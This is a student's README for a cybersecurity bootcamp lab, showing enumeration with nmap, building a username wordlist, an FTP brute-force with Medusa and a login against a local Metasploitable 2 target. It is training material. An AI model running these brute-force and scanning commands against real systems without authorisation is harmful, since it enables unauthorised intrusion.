Santander/DIO Cybersecurity Bootcamp - Pentest & Malware Dev Labs
In this repository I show the initial results of my studies on the Santander and DIO Cibersecurity Bootcamp, completed in 2025\

1. Security and pentesting
Lab Environment
--> Attacker Machine: Kali Linux (IP: 192.168.56.103)
--> Target Machine: Metasploitable 2 (IP: 192.168.56.102)

Tools Used
--> nmap
--> Enum4linux
--> Medusa
--> FTP & smbclient\

There are a total of three exercises:
--> FTP service attack
--> HTTP website attack
--> SMB service attack\

All of them have followed a similar process:
--> Enumeration
--> Brute Force Attack with Medusa\

1.1 FTP ATTACK
1.1.1 ENUMERATION: Searching for available services"
Method: Nmap
Code: nmap -sV -p 21,22,80,445,139 192.168.56.102

In this step I identified which services and ports were open for an attack, using the flag "sV" for identify the version of each service, and the flag "p" to select which ports I wanted to analyse

1.1.2 WORDLISTS: Creating the wordlists
Method: Echo
Code: echo -e 'user\nmsfadmin\nadmin\nroot\nadministrator' > users.txt

After it, I created the wordlists that were used by Medusa to try an access, giving to it the list of users and passwords that I wanted for it to use

1.1.3 ATTACK: Trying the access with Medusa
Method: Medusa
Code: medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6

Next, I executed the brute-force attack using Medusa giving the list of users (flag "U"), the passwords (flag "P") and the target service (flag "M")

1.1.4 ACCESS: Using the results
Method: FTP
Code: ftp 192.168.56.102
